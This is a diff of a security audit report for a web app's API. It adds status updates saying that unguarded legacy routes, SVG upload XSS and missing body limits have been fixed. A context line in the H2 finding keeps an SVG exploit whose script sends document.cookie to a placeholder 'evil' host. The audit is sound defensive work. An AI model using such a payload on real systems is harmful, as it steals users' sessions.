@@ -89,6 +89,11 @@ Three compounding facts:
 ### H1 — Legacy `/v1/<module>` surface bypasses actor + API-key scope enforcement
 **`packages/hono/src/app.ts:398-433`, `packages/hono/src/middleware/require-actor.ts:8,78-94`**
 
+**Status update:** the legacy module `routes` surface and the bare `/v1/*`
+catch-all actor guard have since been removed. Bare `/v1/{name}` is reserved for
+explicit webhook routes; package routes should mount on `/v1/admin/*` or
+`/v1/public/*`.
+
 Actor guards are mounted on only two prefixes:
 ```ts
 app.use("/v1/admin/*",  requireActor("staff"))
@@ -102,10 +107,22 @@ The legacy surface is mounted with no equivalent (`if (mod.routes) app.route(\`/
 ### H2 — Stored XSS via uploads, reachable by any authenticated principal
 **`starters/operator/src/api/media-upload-routes.ts:69-133`, `packages/hono/src/app.ts:397-399`, `lib/storage.ts:7-33`**
 
-`/v1/uploads` and `/v1/media/*` sit on the unguarded legacy surface (H1), so any valid credential — including a customer-portal session or a `voy_` key with any scope — can upload to and read from MEDIA_BUCKET. The serve route derives `Content-Type` from the **client-supplied filename extension** (`guessMimeType` maps `svg`→`image/svg+xml`, `xml`→`application/xml`), with **no `X-Content-Type-Options: nosniff`, no `Content-Disposition`, and no CSP** anywhere in the codebase.
+**Status update:** media upload and serve routes now mount only on the staff
+surface (`/v1/admin/uploads`, `/v1/admin/uploads/video`, and
+`/v1/admin/media/*`). The serve route also forces `nosniff`,
+`Content-Disposition: attachment`, and `application/octet-stream` for scriptable
+MIME types; unsafe scriptable uploads are rejected.
+
+Historically, the upload and media serve routes sat on the unguarded legacy
+surface (H1), so any valid credential — including a customer-portal session or a
+`voy_` key with any scope — could upload to and read from MEDIA_BUCKET. The old
+serve route derived `Content-Type` from the client-supplied filename extension.
 
 **Exploit:** Upload `evil.svg` containing `<svg xmlns=...><script>fetch('https://evil/?c='+document.cookie)</script></svg>`; it serves inline as `image/svg+xml` from the operator Worker origin — the same origin as the SSR admin dashboard. A logged-in staff member who opens the URL executes the script in the admin session. Keys are semi-predictable (`uploads/<ms-timestamp>-<8 hex>`), so objects are also enumerable.
-**Fix:** Move these routes under `/v1/admin/*`; set `nosniff` + `Content-Disposition: attachment` on `/v1/media/*`; restrict served content types to an image/video allowlist (force `application/octet-stream` otherwise); validate extension/magic-bytes on upload; add a global CSP.
+**Fix:** Keep these routes under `/v1/admin/*`; keep `nosniff` +
+`Content-Disposition: attachment`; restrict served content types to safe values
+(force `application/octet-stream` otherwise); validate extension/magic-bytes on
+upload; add a global CSP.
 
 ### H3 — Template engines do not HTML-escape → stored XSS / SSRF in invoices, contracts, emails
 **`packages/templating/src/template-renderer.ts:12,160,197`, `packages/notifications/src/liquid.ts:3`, `packages/finance/src/service-documents.ts:265`, `packages/legal/src/contracts/service-documents-browser.ts:227`**
@@ -192,7 +209,15 @@ Records are keyed by `(scope, key)` where `scope` defaults to `${method} ${pathn
 
 ### M6 — No request body / upload size limits
 **`packages/hono/src/validation.ts:75-89`, `starters/operator/src/api/media-upload-routes.ts:84`**
-`parseJsonBody` does `c.req.json()` with no size guard; the idempotency middleware buffers and re-buffers the full body; `/v1/uploads` does `await file.arrayBuffer()` with no cap (only brochure generation caps at 5 MiB). No global `bodyLimit`. **Impact:** large-JSON / large-upload memory pressure (OOM on a 128 MB isolate) and deep-JSON CPU burn during Zod validation, anonymous on every public POST. **Fix:** mount Hono `bodyLimit` globally before routes; reject early by `Content-Length`.
+
+**Status update:** the app now has a global body limit and the media upload route
+has explicit content-length/file-size limits. The remaining risk in this finding
+is unbounded/deep JSON parsing work before schema validation.
+
+`parseJsonBody` does `c.req.json()` with no depth/CPU guard; the idempotency
+middleware buffers and re-buffers the full body. **Impact:** large/deep JSON can
+still create CPU pressure during Zod validation. **Fix:** keep Hono `bodyLimit`
+mounted globally and add depth/complexity protection for JSON parsing.
 
 ### M7 — One secret reused across three crypto contexts + arbitrary-user token minting
 **`starters/operator/src/api/auth/handler.ts:148,219,227`, `packages/hono/src/middleware/auth.ts:258-269`, `packages/auth/src/backend.ts:26-28`**
